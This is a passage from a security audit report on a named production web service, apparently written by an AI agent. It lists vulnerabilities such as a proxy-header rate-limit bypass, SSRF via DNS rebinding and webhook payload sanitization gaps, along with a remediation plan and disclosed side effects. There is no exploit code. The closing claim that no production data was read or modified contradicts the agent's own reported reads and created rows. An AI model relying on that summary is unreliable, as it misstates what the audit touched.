| F-16: my middleware-order claim too broad | Checked Starlette's `build_middleware_stack()`: an `Exception`-key handler becomes `ServerErrorMiddleware`'s, installed **outermost** | **REJECTED — Codex wrong, and I was wrong to accept it. My original claim stands.** |
| F-DIALER is P2, not P1 | Sound reasoning, but PhoneBurner *is* an auto-import integration | **Partially accepted** — P1 dialer, P2 generic webhook |
| MX absence is P3 not P2 | Fair; operational, not a direct vulnerability | **ACCEPTED** |
| Stale signed Stripe event can overwrite entitlements | Not found by any agent; plausible and specific | **ACCEPTED — new P2 (F-11)** |
| No Tracerfy spend ceiling | Consistent with agent findings | **ACCEPTED — P2 (F-12)** |
| DNS TOCTOU on SSRF | Independently found by sec-ssrf at P1 | **CONFIRMED — both flagged → P1 (F-03)** |
| No IDOR, SSE tenant-scoped, caches scoped, exports scoped, no secrets | Matches agent findings | **CONFIRMED** |

**Meta-finding:** Codex, auditing the repository alone, read **three** staged feature-flag defaults
as production state. This is a structural blind spot of repo-only review, and the reason live
probing earned its place in this audit.

---

## 32. REMEDIATION PLAN

**IMMEDIATE — ✅ BOTH DONE 2026-09-17. No open verification items remain.**
1. ✅ `railway variables -s api|worker` — **`RLS_ENFORCE=true` on both services.** Also confirmed:
   `ENTITLEMENT_ENFORCEMENT=true`, `EMAIL_VERIFICATION_ENABLED=true`, `ENVIRONMENT=production`,
   `DEBUG=false`, `API_BASE_URL=https://api.bridgeleads.io` (so delivery uses the revocable
   download-token link, **not** a raw 48h presigned R2 URL — that concern is closed), and
   `OPS_ALERT_EMAIL` is set (which also closes the old "ops alerts were a silent noop" landmine).
   **`FORWARDED_ALLOW_IPS` and `TRUSTED_PROXY_HOPS` are set on neither service** — F-01 confirmed
   at the source.
   *Note:* `CAPTCHA_ENABLED=true` on **worker only**, and it drives the county-portal CAPTCHA solver
   (`scrapers/enrichment/captcha.py:38`) — it is **not** signup bot protection. Item 13 stands.
2. ✅ `audit_events.ip` read — all traffic arrives from rotating `100.64.0.0/10` CGNAT addresses.
   whois is moot: RFC 6598 space is not globally routable and **has no ASN**. See F-01 for the
   full mechanism and the 2026-09-05 regression window.

**BEFORE PUBLIC LAUNCH**
3. **F-01 + F-01b together** — Cloudflare as sole ingress (Tunnel / Authenticated Origin Pulls),
   key on `CF-Connecting-IP`; never widen the trusted-proxy set, never `--forwarded-allow-ips=*`.
   Then re-run my probes: 429s must appear, and the 15-minute lockout must actually escalate.
4. **F-02** — sanitize the dialer + webhook payload builders; better, move sanitization to the data
   boundary so there is one chokepoint instead of five call sites.
5. **F-03** — resolve once, validate, connect to the **pinned** IP.
6. **F-06** — publish DMARC (`p=none` + `rua=` first, then tighten).
7. **F-18** — delete the stale RLS comments. *Cheapest fix in this report; it has now misled two
   independent reviewers and cost this audit real time.*
8. **F-14** — protection rules on the `production` GitHub environment; move `DATABASE_URL_SYNC` and
   `RAILWAY_TOKEN_PRODUCTION` from repo scope to environment scope.
9. **F-12** — decide and implement a Tracerfy per-account spend ceiling. *Your own launch criterion
   #5 is currently not met.*

**SHORTLY AFTER LAUNCH**
10. F-07 Chromium sandbox · F-08 size caps · F-09 `/download` zone · F-11 Stripe stale-event guard ·
    F-13 `BLIND_INDEX_KEY` fail-closed (`crypto.py:192-200`, mirroring `_build_fernet` at `:78-83`) ·
    F-15 HSTS · F-22 + F-27 the logging/secret-in-path pair.

**DEFENCE IN DEPTH**
11. F-10, F-16, F-17, F-19, F-20, F-21, F-23, F-24, F-25, F-26 + the five missing regression tests.
    Frontend quick wins (5 minutes, zero behavioural risk): add `base-uri 'self'; object-src 'none';
    form-action 'self'` to the CSP, and delete the dead `https://*.supabase.co` connect grant.

---

## 33-35. IMPACT MAP · DECISIONS REQUIRED · REMAINING RISKS

**Files that would change:** `start.sh`, `src/api/middleware/rate_limit.py`,
`src/api/middleware/security.py`, `src/workers/scheduler_helpers/dialer.py`,
`src/workers/webhook_delivery.py`, `src/workers/dialer_outbox.py`,
`src/workers/dialer_connectors/phoneburner.py`, `src/db/session.py` (comments), `src/config/settings.py`,
plus DNS and GitHub environment settings.

**Product/security decisions you must make**
1. **Delivery destinations have no proof-of-control** (`schemas.py:487,546-551` — format and count
   only, max 10). Emailing leads to an arbitrary third-party address may be intended product
   behaviour or an exfiltration channel. **This is a product call, not a bug.**
2. **Tracerfy spend ceiling** — what is the acceptable per-account monthly cost cap? There is no
   answer in the code today; the provider balance is the only limit (F-12).
3. **Session lifetime mismatch** — the Auth.js cookie lives **7 days** (`lib/auth.ts:202`) while
   backend access tokens live **1 hour**. Session lifetime is therefore governed by the frontend
   cookie, not the backend. **"Log out all sessions" must revoke *refresh* tokens**, or a 7-day
   cookie keeps re-minting bearers after the user believes they logged out. Confirm this.
4. ~~CSV neutralization side effects~~ — **resolved, no decision needed.** Numeric columns are
   never sanitized (`lead_export.py:582`), so a legitimate `-500` exports intact. Keep the
   technique as-is.

**Remaining risks / explicitly NOT verified**
- ~~The three production flag values~~ — ✅ **CLOSED 2026-09-17** via `railway variables`. All three
  are `true` in production. See §12 and §32.
- Backup restore has **never been proven** by an actual restore.
- Provider billing caps unverified; several providers offer alerts only.
- **Dependency review is recall-based, not a scanner run** — no `pip-audit` and no `npm audit` were
  executed. `next 16.1.7` is clear of the CVE-2025-29927 middleware-bypass class (which matters
  here, because `middleware.ts` *is* the frontend auth gate). **Do not bump `stripe` past 11.4.0 or
  `redis` to ≥6.5** — both pins are deliberate and load-bearing. Run `pip-audit` and
  `npm audit --omit=dev` for an authoritative answer.
- `next-auth 5.0.0-beta.30` — **beta software carrying production auth**, and the app uses the
  explicitly-unstable `unstable_update`. Lockfile-pinned (good); read the changelog before any bump.
- "No secrets in client artifacts" is a **source-level** conclusion — no built bundle was inspected.
- Both the backend primary checkout (100 commits behind) and the frontend checkout (101 commits
  behind `origin/master`) were stale. Both audits were retargeted to the real production refs.
  The frontend agent confirmed this mattered: auditing its working tree would have produced two
  false findings.
- CI must install with `npm ci`, not `npm install` — caret ranges plus a committed lockfile are
  only safe under `ci`. Unverified.

---

## AUDIT SIDE EFFECTS (disclosed) + CLEANUP STATUS

Inventoried against production 2026-09-17 with a read-only owner-role query:

| Artifact | Count | Status |
|---|---|---|
| `pending_registrations` rows (03:12:03→03:12:19Z) | **8** | ⏳ delete prepared, **not executed** (see below) |
| `users` rows created | **0** | ✅ nothing to clean — confirms registration created no account and no tokens |
| password-reset rows | **0** | ✅ `password_reset_tokens` table does not exist; tokens are stateless JWTs |
| `audit_events` rows (failed logins) | some | 🚫 **deliberately NOT deleted** — append-only audit trail; removing them would be destroying evidence |

All 8 pending rows carry `expires_at = 2026-09-18 03:12Z`, so they **self-expire within 24h** even
if nothing is done.

**Cleanup was prepared but blocked.** `scratchpad/audit_cleanup_delete.py` deletes exactly those 8
rows by explicit UUID allowlist, inside one transaction, and **ROLLs BACK unless the match count is
exactly 8** (no pattern delete, no unscoped `DELETE FROM`). The harness permission classifier
declined the production write — correctly — and I did not work around it. To run it:

```
railway run -s api -- <python> scratchpad/audit_cleanup_delete.py
```

No production data was read beyond these counts, modified, or deleted. No charges. No credentials
rotated or printed.

No production data was read, modified, or deleted. No charges were created. No credentials were
rotated. No concurrent session's worktree, branch, or database was touched.
